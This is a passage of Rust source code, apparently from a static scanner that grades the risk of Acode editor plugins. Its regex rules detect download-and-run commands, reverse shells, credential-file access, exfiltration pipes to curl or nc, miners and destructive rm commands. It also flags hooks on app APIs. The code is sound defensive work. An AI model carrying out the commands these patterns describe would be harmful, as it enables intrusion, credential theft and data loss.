        .keyed(format!("terminal.write:{}", assessment.tier.key())),
    );
    classify_arg_commands(ctx, call.span, call.arg(1));
}

/// A command whose text came from the network or a decoder, graded like the
/// same value reaching `eval`. Constant commands inside a fetch callback are
/// not remote, so only commands with runtime parts count there.
fn classify_command_source(
    ctx: &mut RuleContext<'_>,
    call: &Call<'_>,
    command: Option<&Arg>,
    via: &str,
) {
    let Some(command) = command else {
        return;
    };
    let (id, severity, message) =
        if command.remote || (call.in_remote_callback && command.value.is_none()) {
            (
                "shell.remote_command",
                Severity::Critical,
                format!("Runs a shell command downloaded at runtime through {via}"),
            )
        } else if command.decoded {
            (
                "shell.decoded_command",
                Severity::High,
                format!("Runs a decoded/encoded shell command through {via}"),
            )
        } else {
            return;
        };
    let evidence = command
        .text()
        .map(str::to_string)
        .unwrap_or_else(|| ctx.snippet(call.span));
    ctx.add(
        id,
        severity,
        Category::Shell,
        Some(call.span),
        message,
        evidence,
    );
}

fn classify_terminal_env(ctx: &mut RuleContext<'_>, call: &Call<'_>, method: &str) {
    let (severity, message) = match method {
        "uninstall" | "restore" => (
            Severity::High,
            "Removes or replaces the user's terminal environment",
        ),
        "install" | "startAxs" | "stopAxs" | "backup" | "migrateLegacyHome" => (
            Severity::Medium,
            "Installs or controls the terminal environment",
        ),
        _ => return,
    };
    ctx.push(
        ctx.finding(
            "shell.terminal_environment",
            severity,
            Category::Shell,
            Some(call.span),
            message,
            method,
        )
        .keyed(method),
    );
}

struct CommandRule {
    id: &'static str,
    severity: Severity,
    message: &'static str,
    pattern: Regex,
    /// Matches across lines, so a shell script is checked as a whole too.
    multiline: bool,
    /// Drops matches that look alike but are harmless (the regex crate has
    /// no lookahead).
    counts: Option<fn(&regex::Captures<'_>) -> bool>,
}

impl CommandRule {
    fn with_filter(mut self, counts: fn(&regex::Captures<'_>) -> bool) -> Self {
        self.counts = Some(counts);
        self
    }

    fn is_match(&self, command: &str) -> bool {
        match self.counts {
            None => self.pattern.is_match(command),
            Some(counts) => self
                .pattern
                .captures_iter(command)
                .any(|captures| counts(&captures)),
        }
    }
}

static COMMAND_RULES: LazyLock<Vec<CommandRule>> = LazyLock::new(|| {
    let rule = |id, severity, message, pattern: &str| CommandRule {
        id,
        severity,
        message,
        pattern: Regex::new(&format!("(?i){pattern}")).expect("valid command pattern"),
        multiline: pattern.starts_with("(?s)"),
        counts: None,
    };
    vec![
        rule(
            "download_then_exec",
            Severity::High,
            "Downloads a file and makes it executable",
            r"(?s)\b(curl|wget)\b[^\n]*\s(-o|-O|--output|--output-document)[=\s]*\S+.{0,600}?\bchmod\s+(\+x|[ugoa]+\+[rw]*x|[0-7]*[1357][0-7]{0,2}\b)",
        ),
        rule(
            "untrusted_package_source",
            Severity::Medium,
            "Installs packages from an unverified source (plain-HTTP repository, URL, or git)",
            r"--repository[=\s]+http://|--allow-untrusted|(--index-url|--extra-index-url|\s-i)[=\s]+http://|\b(pip3?|npm|pnpm|yarn)\s+(install|i|add)\b[^\n;&|]*\s(git\+\S+|https?://\S+\.(whl|tar\.gz|tgz|zip)\b)",
        ),
        rule(
            "credential_access",
            Severity::High,
            "Touches SSH keys or stored credentials",
            r"(~|\$HOME|\$\{HOME\}|/root|/home/[^/\s]+)/\.ssh/(id_|authorized_keys)|\.git-credentials|\.netrc\b|\.npmrc\b|\.pypirc\b|\.aws/credentials|\.config/gh/hosts\.yml",
        ),
        rule(
            "file_upload",
            Severity::High,
            "Uploads a local file with curl",
            r#"\bcurl\b[^\n]*(\s-T\s|--upload-file|\s(-d|--data|--data-binary|--data-raw)[=\s]*@|\s-F\s*['"]?[^=\s]+=@)"#,
        ),
        rule(
            "pipe_to_network",
            Severity::High,
            "Pipes environment, history, or file contents to a network tool",
            r"\b(env|printenv|history|cat\s+[^\n|;&]+)\s*\|\s*(curl|wget|nc|ncat|socat)\b",
        ),
        rule(
            "scheduled_persistence",
            Severity::Medium,
            "Schedules commands to run later or at boot",
            r"\bcrontab\b(\s+-[a-z])?|/etc/(init\.d|rc\.local|crontabs|periodic)",
        )
        // `crontab -l` only lists.
        .with_filter(|captures| {
            captures
                .get(1)
                .is_none_or(|flag| !flag.as_str().ends_with('l'))
        }),
        rule(
            "download_and_run",
            Severity::Critical,
            "Downloads a script and pipes it straight into a shell",
            r"(curl|wget)\b[^\n;&]*\|\s*(sudo\s+)?(ba|z|da|k)?sh\b|(ba|z)?sh\s+(-c\s+)?[\x22']?\$\((curl|wget)|(ba)?sh\s+<\(\s*(curl|wget)",
        ),
        rule(
            "decode_and_run",
            Severity::Critical,
            "Decodes base64 and runs the result",
            r"base64\s+(-d|--decode)[^\n;]*\|\s*(ba|z|da)?sh\b",
        ),
        rule(
            "reverse_shell",
            Severity::Critical,
            "Reverse shell pattern",
            r"/dev/(tcp|udp)/|\bnc(at)?\b[^\n;]*\s-e\s|socat\b[^\n;]*exec:|bash\s+-i\s*>&|mkfifo\b[^\n]*\bnc\b",
        ),
        rule(
            "crypto_miner",
            Severity::Critical,
            "Crypto-miner signature",
            r"\bxmrig\b|stratum\+(tcp|ssl)://|\bminerd\b|cpuminer",
        ),
        rule(
            "destroy_user_data",
            Severity::Critical,
            "Recursively deletes shared storage or the home directory",
            // The folder itself (or everything in it), not a path inside it:
            // `rm -rf ~/` is destructive, `rm -rf ~/.cache/x` is cleanup.
            r#"\brm\s+(-[a-z]*r[a-z]*f|-[a-z]*f[a-z]*r|-r\s+-f|-f\s+-r)\s+(--\s+)?["']?((/sdcard|/storage(/emulated(/0)?)?|/data|/mnt/sdcard|~|\$HOME|\$\{HOME\})/?|/)\*?["']?(\s|$|[;&|)])"#,
        ),
        rule(
            "other_app_data",
            Severity::High,
            "Touches another app's private data directory",
            r"/data/(data|user/\d+)/([a-z0-9_.]*)|\brun-as\b",
        )
        // Acode's own data folder is where the terminal lives.
        .with_filter(|captures| {
            captures
                .get(2)
                .is_none_or(|package| !package.as_str().starts_with("com.foxdebug.acode"))
        }),
        rule(
            "privilege_escalation",
            Severity::High,
            "Tries to get root",
            r"\bsu\s+-c\b|\bsudo\s+-S\b",
        ),
        rule(
            "shell_profile_persistence",
            Severity::Medium,
            "Writes to a shell startup file, so the change persists across sessions",
            // Only writes (`>>`, `tee`), not reads such as `cat /etc/profile`.
            r#"(>>?|\btee\s+(-a\s+)?)\s*["']?[^\s"';&|]*(\.(bashrc|bash_profile|profile|zshrc|ashrc|mkshrc)|/etc/profile(\.d/[^\s"';&|]+)?)["']?(\s|$|[;&|)])"#,
        ),
    ]
});

fn classify_command(ctx: &mut RuleContext<'_>, span: Span, command: &str) {
    classify_command_with(ctx, span, command, |_| true);
}

fn classify_command_with(
    ctx: &mut RuleContext<'_>,
    span: Span,
    command: &str,
    include: impl Fn(&CommandRule) -> bool,
) {
    for rule in COMMAND_RULES.iter().filter(|rule| include(rule)) {
        if rule.is_match(command) {
            ctx.push(
                ctx.finding(
                    "shell.dangerous_command",
                    rule.severity,
                    Category::Shell,
                    Some(span),
                    rule.message,
                    command,
                )
                .keyed(rule.id),
            );
        }
    }
    for url in extract_urls(command) {
        ctx.facts.urls.push(url);
    }
}

/// `.sh` files and `#!` shell scripts shipped in the zip; plugins run them
/// through Executor, so they get the same command checks as JS strings.
pub fn is_shell_script(path: &str, bytes: &[u8]) -> bool {
    matches!(
        crate::archive::extension(path).as_str(),
        "sh" | "bash" | "zsh" | "ash"
    ) || bytes
        .strip_prefix(b"#!")
        .and_then(|rest| rest.split(|byte| *byte == b'\n').next())
        .is_some_and(|shebang| {
            let shebang = String::from_utf8_lossy(shebang);
            ["sh", "bash", "zsh", "ash", "dash"]
                .iter()
                .any(|shell| shebang.split(['/', ' ']).any(|part| part.trim() == *shell))
        })
}

pub fn scan_shell_script(ctx: &mut RuleContext<'_>) {
    let source = ctx.source;
    ctx.add(
        "shell.script_file",
        Severity::Low,
        Category::Shell,
        None,
        "Ships a shell script (it can be run through Executor)",
        format!("{} lines", source.lines().count()),
    );
    let mut start = 0;
    for line in source.split_inclusive('\n') {
        let end = start + line.len();
        let text = line.trim_end();
        if !text.trim_start().starts_with('#') && !text.trim().is_empty() {
            classify_command_with(ctx, Span::new(start as u32, end as u32), text, |rule| {
                !rule.multiline
            });
        }
        start = end;
    }
    classify_command_with(ctx, Span::new(0, 0), source, |rule| rule.multiline);
}

fn classify_system(ctx: &mut RuleContext<'_>, call: &Call<'_>, method: &str) {
    use Category::{Filesystem, Native, Network, Tampering};
    let (id, severity, category, message) = match method {
        "requestStorageManager" | "manageAllFiles" => (
            "native.manage_all_files",
            Severity::High,
            Native,
            "Asks for Android all-files access",
        ),
        "requestPermission" | "requestPermissions" => (
            "native.permission_request",
            Severity::Medium,
            Native,
            "Requests Android runtime permissions",
        ),
        "launchApp" => (
            "native.launch_app",
            Severity::Medium,
            Native,
            "Launches another Android app",
        ),
        "setIntentHandler" | "getCordovaIntent" => (
            "native.intent_access",
            Severity::Medium,
            Native,
            "Reads intents sent to Acode",
        ),
        "fileAction" => (
            "native.file_intent",
            Severity::Low,
            Native,
            "Opens a file with another app",
        ),
        "openInBrowser" | "inAppBrowser" => (
            "network.open_browser",
            Severity::Low,
            Network,
            "Opens a URL in a browser",
        ),
        "httpStream" => (
            "network.native_http",
            Severity::Medium,
            Network,
            "Native HTTP request (bypasses the WebView's CORS rules)",
        ),
        "createSymlink" | "setExec" => (
            "filesystem.system_exec_bits",
            Severity::Medium,
            Filesystem,
            "Creates symlinks or marks files executable",
        ),
        "writeText" | "deleteFile" | "copyToUri" | "mkdirs" | "extractAsset" => (
            "filesystem.system_write",
            Severity::Medium,
            Filesystem,
            "Writes or deletes files through the System plugin",
        ),
        "listChildren"
        | "getFilesDir"
        | "getParentPath"
        | "fileExists"
        | "getNativeLibraryPath" => (
            "filesystem.system_read",
            Severity::Low,
            Filesystem,
            "Reads file system metadata through the System plugin",
        ),
        "getRewardStatus" | "redeemReward" => (
            "tampering.rewards",
            Severity::High,
            Tampering,
            "Calls Acode's ad-reward APIs",
        ),
        "getGlobalSetting"
        | "setInputType"
        | "setNativeContextMenuDisabled"
        | "setUiTheme"
        | "setAppIcon"
        | "clearCache" => (
            "native.device_setting",
            Severity::Low,
            Native,
            "Reads or changes app/device settings",
        ),
        "shareText" | "addShortcut" | "pinShortcut" | "pinFileShortcut" | "removeShortcut" => (
            "native.os_integration",
            Severity::Low,
            Native,
            "Uses Android share sheet or shortcuts",
        ),
        _ => return,
    };
    let evidence = call.arg_text(0).unwrap_or("…");
    let key = if id == "native.permission_request" {
        call.arg_value(0).unwrap_or(method).to_string()
    } else {
        method.to_string()
    };
    if id == "network.open_browser" || id == "network.native_http" {
        record_url(ctx, call.arg_text(0));
    }
    ctx.push(
        ctx.finding(
            id,
            severity,
            category,
            Some(call.span),
            message,
            format!("system.{method}({evidence})"),
        )
        .keyed(key),
    );
}

fn classify_sdcard(ctx: &mut RuleContext<'_>, call: &Call<'_>, method: &str) {
    let (id, severity, message) = match method {
        "read" | "listDir" | "stats" | "getPath" | "listStorages" | "exists" => (
            "filesystem.sdcard_read",
            Severity::Low,
            "Reads files through the SDcard plugin",
        ),
        "write" | "createFile" | "createDir" | "copy" | "move" | "rename" | "delete" => (
            "filesystem.sdcard_write",
            Severity::Medium,
            "Writes or deletes files through the SDcard plugin",
        ),
        "getStorageAccessPermission" => (
            "filesystem.storage_access_request",
            Severity::Medium,
            "Asks the user to grant access to a storage folder",
        ),
        "openDocumentFile" | "getImage" | "watchFile" => (
            "filesystem.sdcard_picker",
            Severity::Low,
            "Opens the document picker or watches a file",
        ),
        _ => return,
    };
    if id == "filesystem.sdcard_read" {
        ctx.facts.reads_sensitive_data = true;
    }
    ctx.push(
        ctx.finding(
            id,
            severity,
            Category::Filesystem,
            Some(call.span),
            message,
            format!("sdcard.{method}"),
        )
        .keyed(method),
    );
}

fn classify_remote_storage(
    ctx: &mut RuleContext<'_>,
    call: &Call<'_>,
    protocol: &str,
    method: &str,
) {
    let (id, severity, message) = match method {
        "exec" | "execCommand" => (
            "network.remote_command",
            Severity::High,
            "Runs a command on a remote server",
        ),
        "connect"
        | "connectUsingPassword"
        | "connectUsingKeyFile"
        | "uploadFile"
        | "putFile"
        | "downloadFile"
        | "getFile" => (
            "network.remote_storage",
            Severity::Medium,
            "Connects to or transfers files with an FTP/SFTP server",
        ),
        _ => return,
    };
    ctx.push(
        ctx.finding(
            id,
            severity,
            Category::Network,
            Some(call.span),
            message,
            format!("{protocol}.{method}({})", call.arg_text(0).unwrap_or("")),
        )
        .keyed(format!("{protocol}.{method}")),
    );
}

fn classify_iap(ctx: &mut RuleContext<'_>, call: &Call<'_>, method: &str) {
    let (id, severity, message) = match method {
        "purchase" | "consume" | "acknowledgePurchase" | "setPurchaseUpdatedListener" => (
            "native.in_app_purchase",
            Severity::High,
            "Uses Acode's Google Play billing bridge",
        ),
        "getPurchases" | "getProducts" => {
            ctx.facts.reads_sensitive_data = true;
            (
                "native.purchase_read",
                Severity::Medium,
                "Reads Google Play purchases / tokens",
            )
        }
        _ => return,
    };
    ctx.push(
        ctx.finding(
            id,
            severity,
            Category::Native,
            Some(call.span),
            message,
            format!("iap.{method}"),
        )
        .keyed(method),
    );
}

/// `rest` is what follows `fsOperation(` in the resolved path, e.g.
/// `plugin_dir).writeFile` or `).readFile`.
fn classify_fs_operation(ctx: &mut RuleContext<'_>, call: &Call<'_>, rest: &str) {
    let Some((target, method)) = rest.split_once(").") else {
        return;
    };
    let method = method.rsplit('.').next().unwrap_or(method);
    let writes = matches!(
        method,
        "writeFile"
            | "createFile"
            | "createDirectory"
            | "renameTo"
            | "moveTo"
            | "copyTo"
            | "delete"
    );
    let other_plugin_dir = target
        .strip_prefix("plugin_dir")
        .is_some_and(|literals| !ctx.plugin_id.is_some_and(|own| literals.contains(own)));
    if other_plugin_dir && writes {
        ctx.add(
            "tampering.plugin_files",
            Severity::High,
            Category::Tampering,
            Some(call.span),
            "Writes or deletes files inside the installed-plugins directory",
            format!("fsOperation(PLUGIN_DIR…).{method}"),
        );
        return;
    }
    if classify_self_modify(ctx, call, target, method) {
        return;
    }
    let (id, severity, message) = match method {
        "readFile" | "lsDir" => {
            ctx.facts.reads_sensitive_data = true;
            (
                "filesystem.read",
                Severity::Info,
                "Reads files or lists folders",
            )
        }
        "delete" => (
            "filesystem.delete",
            Severity::Medium,
            "Deletes files or folders",
        ),
        _ if writes => (
            "filesystem.write",
            Severity::Low,
            "Creates, writes, moves, or copies files",
        ),
        _ => return,
    };
    ctx.push(
        ctx.finding(
            id,
            severity,
            Category::Filesystem,
            Some(call.span),
            message,
            format!("fsOperation(…).{method}"),
        )
        .keyed(method),
    );
}

/// Writing scripts where the plugin, or Acode, loads code from means the code
/// that runs later was never part of a reviewed zip. Returns true when it
/// reported something.
fn classify_self_modify(
    ctx: &mut RuleContext<'_>,
    call: &Call<'_>,
    target: &str,
    method: &str,
) -> bool {
    let mut parts = target.split('|');
    let zone = parts.next().unwrap_or("");
    if !matches!(zone, "plugin_dir" | "own_dir" | "app_data") {
        return false;
    }
    // createFile(name, data) and renameTo(name) carry the file name; writeFile
    // writes to the path itself.
    let (name_arg, data_arg) = match method {
        "writeFile" => (None, call.arg(0)),
        "createFile" => (call.arg_value(0), call.arg(1)),
        "renameTo" => (call.arg_value(0), None),
        _ => return false,
    };
    let Some(name) = parts.chain(name_arg).find(|name| is_loadable_name(name)) else {
        return false;
    };
    let file = name.rsplit('/').next().unwrap_or(name).to_ascii_lowercase();
    let entry = ctx
        .entry
        .map_or("main.js", |entry| entry.rsplit('/').next().unwrap_or(entry))
        .to_ascii_lowercase();
    let remote = data_arg
        .is_some_and(|data| data.remote || (call.in_remote_callback && data.value.is_none()));
    let loads_on_start = file == "plugin.json" || (zone != "app_data" && file == entry);
    let (severity, message) = if remote {
        (
            Severity::Critical,
            "Saves downloaded code as a script file, so what runs later was never reviewed",
        )
    } else if loads_on_start {
        (
            Severity::Critical,
            "Rewrites its own entry script or plugin.json at runtime, replacing the reviewed code",
        )
    } else {
        (
            Severity::High,
            "Writes script files where plugins load code from at runtime",
        )
    };
    let confidence = if zone == "own_dir" {
        // Found through a `baseUrl` name, not a constant Acode defines.
        Confidence::Medium
    } else {
        Confidence::High
    };
    ctx.push(
        ctx.finding(
            "tampering.self_modify",
            severity,
            Category::Tampering,
            Some(call.span),
            message,
            format!("fsOperation({zone}…{name}).{method}"),
        )
        .with_confidence(confidence)
        .keyed(file),
    );
    true
}

/// File names Acode or a browser will run: scripts, pages, wasm, the manifest.
fn is_loadable_name(name: &str) -> bool {
    let lower = name.to_ascii_lowercase();
    let file = lower.rsplit('/').next().unwrap_or(&lower);
    file == "plugin.json"
        || [".js", ".mjs", ".cjs", ".html", ".htm", ".wasm"]
            .iter()
            .any(|ext| file.ends_with(ext))
}

/// acode.app API paths that return the signed-in user's account data.
const ACODE_ACCOUNT_READS: &[&str] =
    &["/api/login", "/api/user", "/api/plugin/owned", "owned=true"];

/// Acode's fetch polyfill adds `credentials: "include"` to every request whose
/// URL contains `acode.app/api`, so a plugin's request is made as the
/// signed-in user.
fn classify_acode_account(ctx: &mut RuleContext<'_>, call: &Call<'_>) {
    let Some(url) = call.arg_text(0) else {
        return;
    };
    let lower = url.to_ascii_lowercase();
    if !lower.contains("acode.app/api") {
        return;
    }
    let method = match call.arg(1) {
        None => Some("GET".to_string()),
        Some(options) => match &options.http_method {
            Some(method) => Some(method.to_ascii_uppercase()),
            // An options literal without `method` is still a GET; anything
            // else could say anything.
            None => options.is_object.then(|| "GET".to_string()),
        },
    };
    let span = Some(call.span);
    match method.as_deref() {
        Some("GET" | "HEAD") => {
            if ACODE_ACCOUNT_READS.iter().any(|path| lower.contains(path)) {
                ctx.facts.reads_sensitive_data = true;
                ctx.push(
                    ctx.finding(
                        "network.acode_account_read",
                        Severity::Medium,
                        Category::Network,
                        span,
                        "Reads the signed-in user's acode.app account (Acode sends their session cookies)",
                        url,
                    )
                    .keyed(account_path(&lower)),
                );
            }
        }
        Some(method) => ctx.push(
            ctx.finding(
                "network.acode_account_write",
                Severity::High,
                Category::Network,
                span,
                "Changes data on acode.app as the signed-in user (Acode sends their session cookies)",
                format!("{method} {url}"),
            )
            .keyed(format!("{method} {}", account_path(&lower))),
        ),
        None => ctx.push(
            ctx.finding(
                "network.acode_account_write",
                Severity::Medium,
                Category::Network,
                span,
                "Calls acode.app's API as the signed-in user with a method decided at runtime",
                url,
            )
            .with_confidence(Confidence::Low)
            .keyed(format!("? {}", account_path(&lower))),
        ),
    }
}

/// `https://acode.app/api/plugin/…?x=1` -> `/api/plugin`, stable across ids.
fn account_path(url: &str) -> String {
    let path = url
        .split_once("acode.app")
        .map_or(url, |(_, rest)| rest)
        .split(['?', '#'])
        .next()
        .unwrap_or_default();
    path.split('/')
        .take_while(|part| !part.contains('…'))
        .take(3)
        .collect::<Vec<_>>()
        .join("/")
}

fn classify_cordova_exec(ctx: &mut RuleContext<'_>, call: &Call<'_>) {
    let service = call.arg_value(2);
    let action = call.arg_value(3).unwrap_or("?");
    let span = Some(call.span);
    match service {
        Some("Authenticator") => ctx.push(
            ctx.finding(
                "native.account_bridge",
                if action == "saveToken" {
                    Severity::Critical
                } else {
                    Severity::High
                },
                Category::Native,
                span,
                if action == "saveToken" {
                    "Plants an acode.app session token through Acode's account bridge"
                } else {
                    "Calls Acode's acode.app account bridge directly (log in / log out)"
                },
                format!("Authenticator.{action}"),
            )
            .keyed(action),
        ),
        Some("Tee") => ctx.push(
            ctx.finding(
                "native.plugin_context_bridge",
                Severity::Critical,
                Category::Native,
                span,
                "Calls the plugin-context bridge directly (session/token forgery attempt)",
                format!("Tee.{action}"),
            )
            .keyed(action),
        ),
        Some(service) => ctx.push(
            ctx.finding(
                "native.cordova_exec",
                Severity::High,
                Category::Native,
                span,
                "Calls a native plugin through the raw Cordova bridge instead of its JS API",
                format!("{service}.{action}"),
            )
            .keyed(format!("{service}.{action}")),
        ),
        None => ctx.add(
            "native.cordova_exec_dynamic",
            Severity::Critical,
            Category::Native,
            span,
            "Raw Cordova bridge call with a service name computed at runtime",
            ctx.snippet(call.span),
        ),
    }
}

fn classify_require(ctx: &mut RuleContext<'_>, call: &Call<'_>) {
    let Some(name) = call.arg_value(0) else {
        ctx.add(
            "acode.require_dynamic",
            Severity::Low,
            Category::AcodeApi,
            Some(call.span),
            "acode.require with a module name computed at runtime",
            ctx.snippet(call.span),
        );
        return;
    };
    let lower = name.to_ascii_lowercase();
    ctx.facts.required_modules.push(lower.clone());
    let (id, severity, category, message) = match lower.as_str() {
        // Opening terminal tabs is visible to the user; what gets typed
        // into them is graded at each `write`.
        "terminal" => (
            "shell.terminal_module",
            Severity::Medium,
            Category::Shell,
            "Uses Acode's terminal module (opens terminal tabs)",
        ),
        "fs" | "fsoperation" => (
            "filesystem.module",
            Severity::Info,
            Category::Filesystem,
            "Uses Acode's file system module",
        ),
        "intent" => (
            "acode.intent_module",
            Severity::Low,
            Category::AcodeApi,
            "Uses Acode's intent module",
        ),
        _ => (
            "acode.require_module",
            Severity::Info,
            Category::AcodeApi,
            "Imports an Acode or plugin module",
        ),
    };
    ctx.push(
        ctx.finding(
            id,
            severity,
            category,
            Some(call.span),
            message,
            lower.clone(),
        )
        .keyed(lower),
    );
}

fn classify_define(ctx: &mut RuleContext<'_>, call: &Call<'_>) {
    let Some(name) = call.arg_value(0) else {
        ctx.add(
            "tampering.define_dynamic",
            Severity::Medium,
            Category::Tampering,
            Some(call.span),
            "acode.define with a module name computed at runtime",
            ctx.snippet(call.span),
        );
        return;
    };
    let lower = name.to_ascii_lowercase();
    ctx.facts.defined_modules.push(lower.clone());
    if CORE_MODULES.contains(&lower.as_str()) {
        ctx.push(
            ctx.finding(
                "tampering.core_module_override",
                Severity::Critical,
                Category::Tampering,
                Some(call.span),
                "Replaces a built-in Acode module for every plugin",
                lower.clone(),
            )
            .keyed(lower),
        );
    } else {
        ctx.push(
            ctx.finding(
                "acode.define_module",
                Severity::Info,
                Category::AcodeApi,
                Some(call.span),
                "Exposes a module other plugins can import",
                lower.clone(),
            )
            .keyed(lower),
        );
    }
}

fn classify_lifecycle(ctx: &mut RuleContext<'_>, call: &Call<'_>) {
    let method = call.path.trim_start_matches("acode.");
    match (call.arg_value(0), ctx.plugin_id) {
        (Some(id), Some(own)) if !id.eq_ignore_ascii_case(own) => ctx.push(
            ctx.finding(
                "tampering.other_plugin",
                Severity::High,
                Category::Tampering,
                Some(call.span),
                "Registers or unloads lifecycle hooks for a different plugin id",
                format!("{method}({id:?}), plugin id is {own:?}"),
            )
            .keyed(id.to_ascii_lowercase()),
        ),
        (None, _) if method == "unmountPlugin" => ctx.add(
            "tampering.unmount_dynamic",
            Severity::Medium,
            Category::Tampering,
            Some(call.span),
            "Unloads a plugin whose id is computed at runtime",
            ctx.snippet(call.span),
        ),
        _ => {}
    }
}

/// Assignment target or Object.defineProperty target that patches Acode.
/// Globals installed by Acode's own Cordova plugins. Every plugin calls these,
/// so a hook on them sees (or rewrites) the other plugins' calls.
const NATIVE_GLOBALS: &[&str] = &[
    "system",
    "Executor",
    "Terminal",
    "sdcard",
    "sftp",
    "ftp",
    "iap",
    "CreateServer",
];

/// DOM and built-in methods that, once wrapped, see every event, inserted
/// script, attribute, or function call in the app. Only security-relevant
/// members: polyfills for things like `matches` or `append` are left alone,
/// and so is `Function.prototype.toString`, which every core-js bundle
/// replaces.
const DOM_HOOKS: &[&str] = &[
    "EventTarget.prototype.addEventListener",
    "EventTarget.prototype.removeEventListener",
    "EventTarget.prototype.dispatchEvent",
    "Node.prototype.appendChild",
    "Node.prototype.insertBefore",
    "Node.prototype.replaceChild",
    "Element.prototype.setAttribute",
    "HTMLInputElement.prototype.value",
    "HTMLTextAreaElement.prototype.value",
    "HTMLScriptElement.prototype.src",
    "Function.prototype.call",
    "Function.prototype.apply",
    "Function.prototype.bind",
    "document.createElement",
    "document.addEventListener",
    "document.head.appendChild",
    "document.head.append",
    "document.body.appendChild",
];

/// Ad objects and ids Acode sets on `window` for its rewarded ads.
const AD_GLOBALS: &[&str] = &["ad", "iad", "admob", "adRewardedUnitId"];

fn is_or_under(target: &str, names: &[&str]) -> bool {
    names.iter().any(|name| {
        target == *name
            || target
                .strip_prefix(name)
                .is_some_and(|rest| rest.starts_with('.'))
    })
}

pub fn classify_tamper_target(ctx: &mut RuleContext<'_>, span: Span, target: &str, how: &str) {
    let (id, severity, message) = if target == "acode" || target.starts_with("acode.") {
        (
            "tampering.acode_api",
            Severity::High,
            "Replaces or patches the global acode API",
        )
    } else if target == "cordova" || target.starts_with("cordova.") {
        (
            "tampering.cordova_bridge",
            Severity::High,
            "Patches the Cordova bridge",
        )
    } else if matches!(target, "fetch" | "XMLHttpRequest" | "WebSocket")
        || target.starts_with("XMLHttpRequest.prototype")
        || target.starts_with("WebSocket.prototype")
    {
        (
            "tampering.network_hook",
            Severity::High,
            "Hooks the app's network APIs (can see every request)",
        )
    } else if is_or_under(target, NATIVE_GLOBALS) {
        (
            "tampering.native_api",
            Severity::High,
            "Replaces or patches a native API other plugins use (can see or change their calls)",
        )
    } else if is_or_under(target, DOM_HOOKS) {
        (
            "tampering.dom_hook",
            Severity::High,
            "Hooks a DOM or built-in method used by Acode and every plugin (can intercept input, events, or scripts)",
        )
    } else if is_or_under(target, AD_GLOBALS) {
        (
            "tampering.ads",
            Severity::High,
            "Replaces Acode's ad objects or ad unit id (can redirect ad revenue)",
        )
    } else if is_or_under(target, &["$module:settings.value.pluginsDisabled"]) {
        (
            "tampering.plugin_settings",
            Severity::High,
            "Turns plugins on or off by editing Acode's settings",
        )
    } else if target.starts_with("editorManager.") && !target.contains(".activeFile.") {
        (
            "tampering.editor_manager",
            Severity::Medium,
            "Replaces part of the global editorManager",
        )
    } else {
        return;
    };
    ctx.push(
        ctx.finding(
            id,
            severity,
            Category::Tampering,
            Some(span),
            message,
            format!("{how} {target}"),
        )
        .keyed(target),
    );
}

/// Global names read as values (not called), e.g. `localStorage` or `PLUGIN_DIR`.
pub fn classify_reference(ctx: &mut RuleContext<'_>, name: &str, span: Span) {
    let (id, severity, category, message) = match name {
        "localStorage" | "sessionStorage" => {
            // A plugin reading its own keys is not user data. Dumping every
            // key reads other plugins' and Acode's saved state, so that counts.
            if ctx.facts.web_storage_dump.is_none() {
                let dump = WEB_STORAGE_DUMP.find(ctx.source);
                ctx.facts.web_storage_dump = Some(dump.is_some());
                if let Some(dump) = dump {
                    ctx.facts.reads_sensitive_data = true;
                    ctx.add(
                        "storage.web_storage_dump",
                        Severity::Medium,
                        Category::Storage,
                        Some(Span::new(dump.start() as u32, dump.end() as u32)),
                        "Reads every localStorage / sessionStorage entry, including other plugins' saved data",
                        shorten(dump.as_str(), 120),
                    );
                }
            }
            (
                "storage.web_storage",
                Severity::Info,
                Category::Storage,
                "Uses localStorage / sessionStorage",
            )
        }
        "indexedDB" => (
            "storage.indexeddb",
            Severity::Info,
            Category::Storage,
            "Uses IndexedDB",
        ),
        "document.cookie" => {
            ctx.facts.reads_sensitive_data = true;
            (
                "storage.cookies",
                Severity::Low,
                Category::Storage,
                "Reads or writes document.cookie",
            )
        }
        "PLUGIN_DIR" => (
            "filesystem.plugin_dir",
            Severity::Info,
            Category::Filesystem,
            "References the installed-plugins directory",
        ),
        "editorManager.activeFile.session" | "editorManager.editor.state.doc" => {
            ctx.facts.reads_sensitive_data = true;
            return;
        }
        _ => return,
    };
    ctx.add(id, severity, category, Some(span), message, name);
}

/// Called for every string literal and template chunk.
pub fn classify_string(ctx: &mut RuleContext<'_>, value: &str, span: Span) {
    if value.len() >= 8 && value.contains("://") {
        ctx.facts.urls.extend(extract_urls(value));
    }
    if value.len() >= 37
        && let Some(token) = TELEGRAM_BOT_TOKEN.captures(value).and_then(|c| c.get(1))
    {
        let token = token.as_str();
        let (bot, _) = token.split_once(':').unwrap_or((token, ""));
        ctx.push(
            ctx.finding(
                "network.hardcoded_bot_token",
                Severity::High,
                Category::Network,
                Some(span),
                "Contains a hardcoded Telegram bot token, so messages it sends go to the plugin author's bot",
                format!("bot {bot}:…"),
            )
            .keyed("api.telegram.org"),
        );
    }
    if let Some(module) = decode_wasm_payload(value) {
        if ctx.facts.embedded_wasm.len() < MAX_EMBEDDED_WASM {
            ctx.facts.embedded_wasm.push(module);
        }
        ctx.add(
            "wasm.embedded_module",
            Severity::Low,
            Category::Wasm,
            Some(span),
            "WebAssembly module inlined as a base64 string (decoded and checked like a shipped one)",
            format!("{} base64 characters", value.len()),
        );
        return;
    }
    if value.len() >= BASE64_PAYLOAD_MIN_LEN
        && let Some(decoded) = decode_js_payload(value)
    {
        ctx.add(
            "obfuscation.encoded_js_payload",
            Severity::High,
            Category::Obfuscation,
            Some(span),
            "String literal is base64-encoded JavaScript",
            shorten(&decoded, 160),
        );
    }
}

pub fn scan_source_text(ctx: &mut RuleContext<'_>) {
    let source = ctx.source;
    ctx.facts.minified = source.lines().any(|line| line.len() > LONG_LINE_BYTES);

    let obfuscator_names = count_obfuscator_identifiers(source);
    if obfuscator_names >= 30 {
        ctx.add(
            "obfuscation.obfuscator_tool",
            Severity::High,
            Category::Obfuscation,
            None,
            "Output of a JavaScript obfuscator (`_0x…` identifiers / string-array rotation)",
            format!("{obfuscator_names} `_0x…` identifiers"),
        );
    }

    if source.contains("eval(function(p,a,c,k,e,") {
        ctx.add(
            "obfuscation.packer",
            Severity::High,
            Category::Obfuscation,
            None,
            "Packed with Dean Edwards' packer (eval-based)",
            "eval(function(p,a,c,k,e,…",
        );
    }

    if looks_like_jsfuck(source) {
        ctx.add(
            "obfuscation.jsfuck",
            Severity::High,
            Category::Obfuscation,
            None,
            "Written almost entirely in []()!+ (JSFuck-style encoding)",
